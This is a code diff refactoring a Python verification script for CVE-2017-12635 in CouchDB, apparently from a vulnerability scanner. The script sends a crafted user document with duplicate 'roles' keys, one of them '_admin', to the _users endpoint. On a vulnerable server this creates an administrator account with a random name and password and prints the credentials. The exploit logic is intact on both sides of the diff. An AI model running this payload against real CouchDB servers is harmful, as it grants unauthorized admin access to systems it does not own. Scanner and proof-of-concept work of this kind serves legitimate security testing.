@@ -7,23 +7,17 @@ description: CVE-2017-12635目录穿越与RCE漏洞,RCE漏洞执行比较麻烦
 
 import re
 import json
-import random
-import string
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class CVE_2017_12635_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta=''
+        self.capta = get_capta()
         self. headers = {
             "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
             "Content-Type": "application/json"
         }
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
         self.data = '''{"type": "user","name": \"''' + self.capta + '''\","roles": ["_admin"],"roles": [],"password": \"''' +  self.capta + '''\"}'''
         self.login_data = {
             "name": self.capta,
@@ -34,7 +28,7 @@ class CVE_2017_12635_BaseVerify:
         try:
             if not self.url.startswith("http") and not self.url.startswith("https"):
                 self.url = "http://" + self.url
-            req = requests.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers, allow_redirects = False, verify = False)
+            req = request.put(self.url + "/_users/org.couchdb.user:" + self.capta, data = self.data, headers = self.headers)
             self.headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
             if req.status_code == 201 and json.loads(req.text)['ok'] == True:
                 print("存在CVE-2017-12635漏洞,添加的账号和密码为:", self.capta, self.capta)
